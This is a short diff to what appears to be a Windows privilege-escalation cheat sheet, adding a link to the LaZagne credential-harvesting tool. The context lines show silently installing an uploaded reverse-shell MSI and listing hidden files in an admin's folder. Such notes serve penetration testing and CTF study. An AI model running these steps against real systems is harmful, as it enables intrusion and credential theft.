@@ -250,6 +250,7 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     #upload reverse shell to C:\temp and run    
     msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords  
+[LaZagne](https://github.com/AlessandroZ/LaZagne/tree/master): search for creds.    
 Hidden Files  
 
     PS > Get-ChildItem -Hidden -Path C:\Users\admin\Desktop\     
